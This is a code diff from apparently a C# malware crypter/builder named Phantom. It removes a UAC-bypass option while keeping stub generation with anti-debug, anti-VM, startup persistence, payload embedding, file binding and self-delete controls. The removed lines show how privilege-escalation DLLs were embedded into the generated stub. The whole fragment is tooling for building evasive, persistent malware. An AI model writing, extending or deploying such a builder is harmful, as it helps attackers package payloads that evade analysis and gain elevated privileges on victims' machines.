@@ -234,7 +234,7 @@ namespace Phantom
             listBox2.Items.Add(@"Creating stub...");
 
             // Generate C# stub code
-            string stub = StubGen.CreateCS(_stubkey, _stubiv, mode, antiDebug.Checked, antiVM.Checked, startup.Checked, uacBypass.Checked, !isnetasm, rng);
+            string stub = StubGen.CreateCS(_stubkey, _stubiv, mode, antiDebug.Checked, antiVM.Checked, startup.Checked, !isnetasm, rng);
 
             // Add message to listBox2
             listBox2.Items.Add(@"Building stub...");
@@ -258,18 +258,6 @@ namespace Phantom
 
             // Add embedded resources to compiler parameters
             parameters.EmbeddedResources.Add(@"payload.exe");
-            if (uacBypass.Checked)
-            {
-                if (fileType == FileType.NET64 || fileType == FileType.x64)
-                {
-                    File.WriteAllBytes(@"UAC", Compress(ExtractResource(@"Phantom.Resources.UAC64.dll")));
-                }
-                else
-                {
-                    File.WriteAllBytes(@"UAC", Compress(ExtractResource(@"Phantom.Resources.UAC.dll")));
-                }
-                parameters.EmbeddedResources.Add(@"UAC");
-            }
             foreach (string item in listBox1.Items)
             {
                 parameters.EmbeddedResources.Add(item);
@@ -284,10 +272,6 @@ namespace Phantom
                 // Delete temporary files
                 File.Delete(@"payload.txt");
                 File.Delete(tempfile);
-                if (uacBypass.Checked)
-                {
-                    File.Delete(@"UAC");
-                }
 
                 // Show error message
                 MessageBox.Show(@"Stager Stub build error!", @"Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
@@ -305,10 +289,6 @@ namespace Phantom
             // Delete temporary files
             File.Delete(@"payload.exe");
             File.Delete(tempfile);
-            if (uacBypass.Checked)
-            {
-                File.Delete(@"UAC");
-            }
 
             // Create another temporary file
             tempfile = CreateTempFile(rng);
@@ -462,7 +442,6 @@ namespace Phantom
             hidden.Checked = obj.hidden;
             runas.Checked = obj.runas;
             startup.Checked = obj.startup;
-            uacBypass.Checked = obj.uacBypass;
             try
             {
                 listBox1.Items.AddRange(obj.bindedFiles);
@@ -483,7 +462,6 @@ namespace Phantom
                 hidden = hidden.Checked,
                 runas = runas.Checked,
                 startup = startup.Checked,
-                uacBypass = uacBypass.Checked,
             };
             List<string> paths = new List<string>();
             foreach (string item in listBox1.Items)
@@ -503,42 +481,12 @@ namespace Phantom
             }
             else
             {
-                if (!uacBypass.Checked)
-                {
-                    selfDelete.Enabled = true;
-                }
-            }
-        }
-
-        private void uacBypass_CheckedChanged(object sender, EventArgs e)
-        {
-            if (uacBypass.Checked)
-            {
-                if (runas.Checked)
-                {
-                    runas.Checked = false;
-                }
-                selfDelete.Checked = false;
-                selfDelete.Enabled = false;
-            }
-            else
-            {
-                if (!startup.Checked)
-                {
-                    selfDelete.Enabled = true;
-                }
+                selfDelete.Enabled = true;
             }
         }
 
         private void runas_CheckedChanged(object sender, EventArgs e)
         {
-            if (runas.Checked)
-            {
-                if (uacBypass.Checked)
-                {
-                    uacBypass.Checked = false;
-                }
-            }
         }
     }
 }
